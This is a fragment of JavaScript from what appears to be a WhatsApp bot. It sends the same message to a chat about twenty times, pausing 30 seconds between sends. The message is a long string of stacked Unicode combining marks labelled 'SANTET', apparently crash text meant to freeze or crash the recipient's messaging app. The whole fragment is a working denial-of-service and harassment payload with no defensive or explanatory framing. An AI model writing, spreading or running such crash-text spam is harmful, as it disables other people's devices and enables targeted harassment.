            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
            await hisoka.sendMessage(m.chat, {text:"𑁔⃟᩵᩵᩵᩵ˌ𝚦꙲⃟♜𝟱͓͓ᰱᰱ𝟬͓͓݁݁݁݁݁݁݁݁݁݁ᰱᰱ𝟱͓͓ᰱᰱ 𝙨᰷᰷᰷݁݁𝙤᰷᰷᰷݁݁݁𝙥᰷᰷᰷݁݁݁݁݁𝙤᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙠᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁ 𝙖᰷᰷᰷݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁𝙜᰷᰷᰷݁݁݁݁݁݁݁݁݁݁𝙚᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁𝙣᰷᰷᰷݁݁݁݁݁݁݁݁݁݁݁݁݁♜⃤꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲꙲݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁݁͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠͠⵰ SANTET"},{quoted:asukonyol11})
            await sleep(30000)
